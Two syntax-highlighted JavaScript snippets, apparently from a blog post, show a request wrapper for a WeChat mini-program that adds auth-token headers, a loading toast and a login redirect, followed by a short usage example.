-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> host = <span class="string">&quot;http://www.baidu.com&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> showLoading = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">HOST</span>: host,</span><br><span class="line">  <span class="attr">API_ROOT</span>: host + <span class="string">&#x27;/api/&#x27;</span>,</span><br><span class="line">  <span class="attr">API_VERSION</span>: <span class="string">&#x27;1.0.0&#x27;</span>,</span><br><span class="line">  <span class="title function_">get</span>(<span class="params">options</span>) &#123;</span><br><span class="line">    options.<span class="property">method</span> = <span class="string">&#x27;GET&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">request</span>(options);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">post</span>(<span class="params">options</span>) &#123;</span><br><span class="line">    options.<span class="property">method</span> = <span class="string">&#x27;POST&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">request</span>(options);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">delete</span>(<span class="params">options</span>) &#123;</span><br><span class="line">    options.<span class="property">method</span> = <span class="string">&#x27;DELETE&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">request</span>(options);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">put</span>(<span class="params">options</span>) &#123;</span><br><span class="line">    options.<span class="property">method</span> = <span class="string">&#x27;PUT&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">request</span>(options);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">request</span>(<span class="params">options</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> that = <span class="variable language_">this</span></span><br><span class="line">    <span class="keyword">var</span> apiRoot = <span class="variable language_">this</span>.<span class="property">API_ROOT</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> token = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      token = wx.<span class="title function_">getStorageSync</span>(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> requireLogin = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> options.<span class="property">login</span> == <span class="string">&#x27;undefined&#x27;</span> || options.<span class="property">login</span> == <span class="literal">true</span>) &#123;</span><br><span class="line">      requireLogin = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      requireLogin = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> options.<span class="property">loading</span> != <span class="string">&#x27;undefined&#x27;</span> &amp;&amp; options.<span class="property">loading</span> == <span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(showLoading)</span><br><span class="line">      showLoading = <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        wx.<span class="title function_">showToast</span>(&#123;</span><br><span class="line">          <span class="attr">title</span>: <span class="string">&quot;加载中&quot;</span>,</span><br><span class="line">          <span class="attr">icon</span>: <span class="string">&quot;loading&quot;</span>,</span><br><span class="line">          <span class="attr">duration</span>: <span class="number">1e4</span></span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;, <span class="number">500</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      wx.<span class="title function_">request</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: apiRoot + options.<span class="property">url</span>,</span><br><span class="line">        <span class="attr">data</span>: options.<span class="property">data</span>,</span><br><span class="line">        <span class="attr">method</span>: options.<span class="property">method</span> ? options.<span class="property">method</span> : <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="attr">header</span>: &#123;</span><br><span class="line">          <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;XX-Token&#x27;</span>: token,</span><br><span class="line">          <span class="string">&#x27;XX-Device-Type&#x27;</span>: <span class="string">&#x27;wxapp&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;XX-Api-Version&#x27;</span>: that.<span class="property">API_VERSION</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">success</span>: <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="built_in">clearTimeout</span>(showLoading)</span><br><span class="line">          wx.<span class="title function_">hideToast</span>()</span><br><span class="line">          <span class="keyword">if</span> (res.<span class="property">data</span>.<span class="property">code</span> == <span class="number">10001</span> &amp;&amp; requireLogin) &#123;</span><br><span class="line">            <span class="comment">// 执行登陆</span></span><br><span class="line">            <span class="keyword">let</span> currentPages = <span class="title function_">getCurrentPages</span>();</span><br><span class="line">            <span class="keyword">let</span> currentRoute = currentPages.<span class="title function_">pop</span>()[<span class="string">&#x27;__route__&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (currentRoute != <span class="string">&#x27;pages/login/login&#x27;</span>) &#123;</span><br><span class="line">              wx.<span class="title function_">navigateTo</span>(&#123;</span><br><span class="line">                <span class="attr">url</span>: <span class="string">&#x27;/pages/login/login&#x27;</span></span><br><span class="line">              &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_">resolve</span>(res)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">fail</span>: <span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="built_in">clearTimeout</span>(showLoading)</span><br><span class="line">          wx.<span class="title function_">hideToast</span>()</span><br><span class="line">          <span class="title function_">reject</span>(error)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ajax <span class="keyword">from</span> <span class="string">&#x27;../utils/ajax.js&#x27;</span></span><br><span class="line"></span><br><span class="line">ajax.<span class="title function_">get</span>(&#123;</span><br><span class="line">  <span class="attr">url</span>: url,</span><br><span class="line">  <span class="attr">login</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">loading</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(error)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
       
     </div>
 
